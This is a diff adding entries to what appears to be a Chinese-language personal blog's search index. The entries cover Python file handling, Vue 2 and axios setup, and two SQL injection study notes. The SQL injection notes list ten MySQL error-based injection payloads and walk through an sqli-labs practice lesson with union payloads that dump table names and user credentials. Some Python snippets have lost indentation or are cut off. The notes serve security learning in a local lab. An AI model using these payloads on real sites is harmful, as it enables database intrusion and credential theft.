@@ -1,6 +1,272 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Python文件操作</title>
+    <url>/2023/12/21/text18/</url>
+    <content><![CDATA[
+        <h3 id="Python-文件操作详解"   >
+          <a href="#Python-文件操作详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-文件操作详解" class="headerlink" title="Python 文件操作详解"></a>Python 文件操作详解</h3>
+      <p>Python 提供了多种文件操作的工具，使得文件的读写和处理变得非常方便。以下是文件操作的一些关键概念和示例。</p>
+
+        <h4 id="1-打开文件"   >
+          <a href="#1-打开文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-打开文件" class="headerlink" title="1. 打开文件"></a>1. 打开文件</h4>
+      <p>使用 <code>open()</code> 函数打开文件。语法如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">file = open(&#x27;filename&#x27;, &#x27;mode&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li><code>&#39;filename&#39;</code>：要打开的文件名或路径。</li>
+<li><code>&#39;mode&#39;</code>：打开文件的模式，如 <code>&#39;r&#39;</code> 表示读取模式，<code>&#39;w&#39;</code> 表示写入模式，<code>&#39;a&#39;</code> 表示追加模式，<code>&#39;b&#39;</code> 表示二进制模式等。</li>
+</ul>
+
+        <h4 id="2-读取文件"   >
+          <a href="#2-读取文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-读取文件" class="headerlink" title="2. 读取文件"></a>2. 读取文件</h4>
+      <p>使用不同的方法读取文件内容：</p>
+<p># 读取整个文件 </p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">content = file.read()</span><br><span class="line"></span><br><span class="line">print(content)</span><br></pre></td></tr></table></div></figure>
+
+<p># 逐行读取文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">lines = file.readlines()</span><br><span class="line"></span><br><span class="line">for line in lines: </span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="3-写入文件"   >
+          <a href="#3-写入文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-写入文件" class="headerlink" title="3. 写入文件"></a>3. 写入文件</h4>
+      <p># 写入整个文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;Hello, World!&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+<p># 追加内容到文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;a&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;\nAppending more content.&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="4-文件迭代器"   >
+          <a href="#4-文件迭代器" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-文件迭代器" class="headerlink" title="4. 文件迭代器"></a>4. 文件迭代器</h4>
+      <p>使用 <code>for</code> 循环逐行读取文件：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">for line in file:</span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="5-关闭文件"   >
+          <a href="#5-关闭文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-关闭文件" class="headerlink" title="5. 关闭文件"></a>5. 关闭文件</h4>
+      <p>在使用 <code>open()</code> 打开文件后，使用 <code>close()</code> 方法关闭文件：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line">codefile = <span class="built_in">open</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">content = file.read()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="6-使用-with-语句"   >
+          <a href="#6-使用-with-语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-使用-with-语句" class="headerlink" title="6. 使用 with 语句"></a>6. 使用 <code>with</code> 语句</h4>
+      <p>使用 <code>with</code> 语句可以自动管理文件的打开和关闭，确保文件正确关闭：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    # 在此处文件自动关闭</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="7-二进制文件操作"   >
+          <a href="#7-二进制文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-二进制文件操作" class="headerlink" title="7. 二进制文件操作"></a>7. 二进制文件操作</h4>
+      <p>读写二进制文件的示例：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;binary_file.bin&#x27;, &#x27;wb&#x27;) as file:</span><br><span class="line">    file.write(b&#x27;Binary data&#x27;)</span><br><span class="line"></span><br><span class="line">with open(&#x27;binary_file.bin&#x27;, &#x27;rb&#x27;) as file:</span><br><span class="line">    data = file.read()</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="8-文件异常处理"   >
+          <a href="#8-文件异常处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-文件异常处理" class="headerlink" title="8. 文件异常处理"></a>8. 文件异常处理</h4>
+      <p>在文件操作中添加异常处理，防止程序崩溃：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codetry:</span><br><span class="line">    with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">        content = file.read()</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(&#x27;File not found!&#x27;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&#x27;An error occurred: &#123;e</span><br></pre></td></tr></table></div></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>SQL注入2</title>
+    <url>/2023/12/21/text17/</url>
+    <content><![CDATA[
+        <h1 id="1-postman使用"   >
+          <a href="#1-postman使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-postman使用" class="headerlink" title="1.postman使用"></a>1.postman使用</h1>
+      <p>1.进入火狐浏览器按shift+f12左下角网络在相应的页面发生请求可以获得网络活动信息可以找到对应的api请求</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193551394.png" alt="image-20231221193551394"></p>
+<p>2.点击new选择http将获取到的api链接放到上方地址栏根据实际情况选择GET还是其它请求点击send就能发送api请求</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221192829536.png" alt="image-20231221192829536"></p>
+<p>3.在下方id一栏可以输入注入的sql语句后点击send就能执行注入获得数据库信息</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193745503.png" alt="image-20231221193745503"></p>
+
+        <h1 id="2-SQL注入之MySQL报错"   >
+          <a href="#2-SQL注入之MySQL报错" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入之MySQL报错" class="headerlink" title="2.SQL注入之MySQL报错"></a>2.SQL注入之MySQL报错</h1>
+      <p>1.报错注入十大方法，依次是：</p>
+<p>（1）floor() 　　如：select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p>
+<p>（2）extractvalue()　　如：select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
+<p>（3）updatexml()　　如：select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
+<p>（4）geometrycollection()　　如：select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</p>
+<p>（5）multipoint()　　如：select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</p>
+<p>（6）polygon()　　如：select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</p>
+<p>（7）multipolygon()　　如：select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</p>
+<p>（8）linestring()　　如：select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</p>
+<p>（9）multilinestring()　　如：select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</p>
+<p>（10）exp()　　如：select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</p>
+<p>2.使用方法就是把select user部分语句换成自己想用来获取什么数据信息的语句</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221201250317.png" alt="image-20231221201250317"></p>
+
+        <h1 id="3-sql注入介绍"   >
+          <a href="#3-sql注入介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sql注入介绍" class="headerlink" title="3.sql注入介绍"></a>3.sql注入介绍</h1>
+      <p>1.SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。</p>
+<p>2.SQL注入漏洞的成因：用户提交的参数数据未做充分检查过滤<br><span class="exturl"><a class="exturl__link"   href="http://www.any.com/index.jsp?username=admin&pass=pass" >http://www.any.com/index.jsp?username=admin&amp;pass=pass</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>3.SQL注入的危害：<br>（1）数据泄露：数据库中存放的用户的隐私信息的泄露。</p>
+<p>（2）网页篡改：通过操作数据库对特定网页进行篡改。</p>
+<p>（3）网站挂马：修改数据库一些字段的值嵌入网马链接，进行挂马攻击</p>
+<p>（4）服务器被远程控制：被安装后门。经由数据库服务器提供的操作系统支持让黑客得以修改或控制      操作系统。<br>（5）数据破坏：数据库服务器被攻击，数据库的系统管理员帐户被窜改系统瘫痪。</p>
+<p>4.SQL注入分类：</p>
+<p>（1）<strong>基于错误的注入（Error-Based SQL Injection）：</strong> 攻击者通过触发应用程序中的错误，从错误消息中获取敏感信息，或者利用错误来执行进一步的攻击。</p>
+<p>（2）<strong>联合查询注入（Union-Based SQL Injection）：</strong> 攻击者利用<code>UNION</code>语句将额外的数据行合并到查询结果中，通常用于提取其他表的信息。</p>
+<p>（3）<strong>时间盲注入（Time-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入延时函数，从而判断条件是否为真。这种注入方式常用于盲注入攻击，无法直接获取数据，但可以通过延时来确认注入点。</p>
+<p>（4）<strong>基于布尔的盲注入（Boolean-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入布尔条件，判断查询是否返回真或假，从而逐位地获取数据。</p>
+<p>（5）<strong>堆叠查询注入（Stacked Queries SQL Injection）：</strong> 攻击者在单个SQL查询中执行多个查询，从而实现复杂的数据库操作。</p>
+<p>（6）<strong>报错盲注入（Error-Based Blind SQL Injection）：</strong> 类似于基于错误的注入，但攻击者无法直接看到错误消息，而是通过观察应用程序的行为来判断注入是否成功。</p>
+<p>（7）<strong>UNION查询注入：</strong> 攻击者通过构造<code>UNION</code>语句将额外的数据行合并到查询结果中，从而获取其他表的信息。</p>
+<p>（8）<strong>注释符(#)绕过：</strong> 攻击者通过在注入点使用<code>#</code>符号来注释掉原有的SQL语句，从而绕过输入验证。</p>
+<p>（9）<strong>报错注入：</strong> 攻击者通过构造恶意的输入，使得数据库产生错误，从而获取敏感信息。</p>
+<p>（10）<strong>时间盲注入：</strong> 攻击者通过引入时间延迟，判断SQL查询条件是否为真，从而逐步获取数据。</p>
+<p>（11）<strong>Second-Order注入：</strong> 攻击者利用应用程序中存储的用户输入，使得后续的操作受到影响。</p>
+<p>5.SQL Injection函数</p>
+<p>user（)：当前用户名<br>database(）：当前所用数据库<br>current_user()：当前用户名（可用来查看权限)<br>version()：数据库的版本<br>@@datadir：数据库的路径<br>@@version_compile_os：操作系统版本<br>into dumpfile：写文件操作</p>
+<p>into outfile :写文件</p>
+<p>load_file()∶读文件操作</p>
+<p>concat(str1,str2..)∶连接字符串，连接两个或多个数组</p>
+<p>group_concat(str1,str2..)∶连接字符串，能将相同的行组合起来</p>
+<p>length ( ) &#x3D;&gt;计算字符串长度</p>
+<p>hex ( ) &#x3D;&gt;字符转换为16进制</p>
+<p>6.SQL注释</p>
+<ol>
+<li><strong>单行注释：</strong><ul>
+<li>单行注释以<code>--</code>开头，后面的内容将被视为注释。</li>
+<li>示例：<code>SELECT * FROM users WHERE username = &#39;admin&#39;; -- This is a comment</code></li>
+</ul>
+</li>
+<li><strong>多行注释：</strong><ul>
+<li>多行注释使用<code>/*</code>开头，以<code>*/</code>结尾，之间的内容将被视为注释。</li>
+<li>示例：</li>
+<li>&#x2F;*<br>   This is a multi-line comment<br>   It can span across multiple lines<br>   SELECT * FROM users WHERE username &#x3D; ‘admin’;<br>*&#x2F;</li>
+</ul>
+</li>
+</ol>
+<p>7.information _schema库</p>
+<p><code>information_schema</code> 是 MySQL 数据库系统（SQL5开始）中的一个系统数据库，它包含了有关数据库服务器的元数据（metadata元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）和其他信息。这个数据库中的表和视图提供了对数据库服务器状态和配置的访问。</p>
+<p>（1）<strong>SCHEMATA：</strong></p>
+<ul>
+<li>包含所有数据库的信息，比如数据库名称、字符集、排序规则等。</li>
+</ul>
+<p>（2）<strong>TABLES：</strong></p>
+<ul>
+<li>包含所有表的信息，比如表名、所属数据库、表类型、存储引擎等。</li>
+</ul>
+<p>（3）<strong>COLUMNS：</strong></p>
+<ul>
+<li>包含所有表的列信息，如列名、数据类型、是否为主键等。</li>
+</ul>
+<p>（4）<strong>STATISTICS：</strong></p>
+<ul>
+<li>包含表索引的统计信息，如索引名、唯一键信息等。</li>
+</ul>
+<p>（5）<strong>KEY_COLUMN_USAGE：</strong></p>
+<ul>
+<li>包含使用主键或唯一键的外键信息。</li>
+</ul>
+<p>（6）<strong>ROUTINES：</strong></p>
+<ul>
+<li>包含存储过程和函数的信息。</li>
+</ul>
+<p>（7）<strong>VIEWS：</strong></p>
+<ul>
+<li>包含数据库中所有视图的信息。</li>
+</ul>
+<p>（8）<strong>USER_PRIVILEGES、SCHEMA_PRIVILEGES、TABLE_PRIVILEGES：</strong></p>
+<ul>
+<li>包含用户和角色的权限信息。</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入1</title>
+    <url>/2023/12/20/text16/</url>
+    <content><![CDATA[
+        <h1 id="1-MySQL的一些语法知识"   >
+          <a href="#1-MySQL的一些语法知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-MySQL的一些语法知识" class="headerlink" title="1.MySQL的一些语法知识"></a>1.MySQL的一些语法知识</h1>
+      <p>– 选择所有列的所有行<br>SELECT * FROM users;</p>
+<p>– 选择特定列的所有行<br>SELECT username, email FROM users;</p>
+<p>– 添加 WHERE 子句，选择满足条件的行<br>SELECT * FROM users WHERE is_active &#x3D; TRUE;</p>
+<p>– 添加 ORDER BY 子句，按照某列的升序排序<br>SELECT * FROM users ORDER BY birthdate;</p>
+<p>– 添加 ORDER BY 子句，按照某列的降序排序<br>SELECT * FROM users ORDER BY birthdate DESC;</p>
+<p>– 添加 LIMIT 子句，限制返回的行数<br>SELECT * FROM users LIMIT 10;</p>
+<p> –等于条件</p>
+<p>SELECT * FROM users WHERE username &#x3D; ‘test’;</p>
+<p>–UNION 操作符：操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。</p>
+<p>SELECT city FROM customers UNION  SELECT city FROM suppliers  ORDER BY city;</p>
+<p>–GROUP_CONCAT：组内值连接成字符串的聚合函数。用于在分组的基础上将某个列的值连接成一个字符串。</p>
+<p>SELECT,GROUP_CONCAT(table_name) ,3 FROM information_schema.tables where table_schema&#x3D;database();</p>
+<p>SELECT GROUP_CONCAT(id,”<del>“,username,”</del>“,password) FROM users ;</p>
+<p>–select 123</p>
+<p><code>SELECT 123</code> 是一个简单的查询，它返回一个包含单个值 <code>123</code> 的结果集。<code>1</code> 和 <code>3</code> 是两个固定的常量，它们分别成为查询结果的两个列。它们没有实际的数据库含义，只是作为结果集的一部分而存在。</p>
+
+        <h1 id="2-SQL注入练习"   >
+          <a href="#2-SQL注入练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入练习" class="headerlink" title="2.SQL注入练习"></a>2.SQL注入练习</h1>
+      <p>1.环境准备数据库和apache服务都要开，安装php5.59版本(版本过高有些内容无法使用)</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202023010.png" alt="image-20231220202023010"></p>
+<p>把sqli文件放在网站根目录，打开网站</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202331397.png" alt="image-20231220202331397"></p>
+<p>点击[Setup&#x2F;reset Database for labs]安装重置数据库文件，会出现如下页面代表能够进行注入练习</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202421678.png" alt="image-20231220202421678"></p>
+<p>安装Hackbar扩展，安装完成后按shift+f12能看到下方有Hackbar</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202855062.png" alt="image-20231220202855062"></p>
+<p>2.点击less1就能进入练习</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202932975.png" alt="image-20231220202932975"></p>
+<p>load url(加载本页链接可以在链接后面加注入语句)</p>
+<p>excute（执行链接）</p>
+<p>在 SQL 中，<code>--</code> 是注释符号，表示其后的文本将被视为注释而不被执行。当在 SQL 注入攻击中使用 <code>--</code> 时，目的是注释掉原始 SQL 语句的剩余部分，以防止它破坏注入 payload。</p>
+<p>通过？id&#x3D;1’– -注入成功登录如下图</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220203801878.png" alt="image-20231220203801878"></p>
+<p>加入更多的数据查询语句获取更多信息：?id&#x3D;-1’union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database()– -</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204545237.png" alt="image-20231220204545237"></p>
+<p>?id&#x3D;-1’union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204634420.png" alt="image-20231220204634420"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>axios引用,html导入vue2,vue2数据绑定</title>
+    <url>/2023/12/18/text14/</url>
+    <content><![CDATA[
+        <h1 id="Axios-引用"   >
+          <a href="#Axios-引用" class="heading-link"><i class="fas fa-link"></i></a><a href="#Axios-引用" class="headerlink" title="Axios 引用"></a>Axios 引用</h1>
+      <p>Axios 是一个基于 Promise 的 HTTP 客户端，用于浏览器和 Node.js。你可以使用 Axios 来发送异步请求，例如从服务器获取数据。</p>
+<p>在 HTML 文件中引入 Axios：</p>
+<!-- 导入 Axios -->
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+<p>可以下载axios文件本地路径引用</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205753451.png" alt="image-20231223205753451"></p>
+<p>然后，你可以在 JavaScript 中使用 Axios 发送请求。以下是一个简单的例子：</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205847845.png" alt="image-20231223205847845"></p>
+
+        <h1 id="HTML-导入-Vue-2"   >
+          <a href="#HTML-导入-Vue-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTML-导入-Vue-2" class="headerlink" title="HTML 导入 Vue 2"></a>HTML 导入 Vue 2</h1>
+      <p>Vue.js 是一套构建用户界面的渐进式框架。下面是如何在 HTML 文件中导入 Vue 2：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;!-- 导入 Vue 2 --&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>和axios一样也可以下载到本地进行导用</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210036072.png" alt="image-20231223210036072"></p>
+
+        <h1 id="Vue-2-数据绑定使用教程"   >
+          <a href="#Vue-2-数据绑定使用教程" class="heading-link"><i class="fas fa-link"></i></a><a href="#Vue-2-数据绑定使用教程" class="headerlink" title="Vue 2 数据绑定使用教程"></a>Vue 2 数据绑定使用教程</h1>
+      <p>Vue 2 提供了强大的数据绑定机制，以下是一个简单的使用实例：</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210450633.png" alt="image-20231223210450633"></p>
+<ol>
+<li><strong>el: ‘#app’：</strong> 这里指定了 Vue 实例的挂载点，也就是 HTML 中的 <code>id=&quot;app&quot;</code> 的元素。Vue 将会控制这个元素内部的内容。</li>
+<li><strong>data: function()：</strong> 在 <code>data</code> 中定义了 Vue 实例的数据。<code>visible</code> 控制一个元素或组件的可见性，而 <code>userData</code> 是一个包含用户信息的对象，包括 <code>username</code> 和 <code>password</code>。</li>
+<li><strong>methods：</strong> 这里定义了一些方法，其中包括：<ul>
+<li><strong>login：</strong> 处理用户登录的方法。使用 Axios 发送 POST 请求到 <code>http://127.0.0.1/api1.php</code>，将 <code>this.userData</code>（包含用户输入的用户名和密码）作为请求体发送。然后，根据响应判断是否登录成功，如果成功，重定向到 <code>http://127.0.0.1/index.php</code>，否则调用 <code>open4</code> 方法弹出错误通知。</li>
+<li><strong>open4：</strong> 使用 Element UI 的 <code>$notify</code> 方法弹出一个错误通知，显示错误的标题和消息。</li>
+</ul>
+</li>
+</ol>
+<p>整个 Vue 实例的作用是监听用户的输入，通过 Axios 发送登录请求，并根据返回结果执行相应的操作。这是一个简单的用户登录页面的前端逻辑。注意，这里的实例中使用了 Element UI 的通知组件，确保你已经导入 Element UI 的相关库和样式。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>PHP</title>
     <url>/2023/12/12/text15/</url>
     <content><![CDATA[
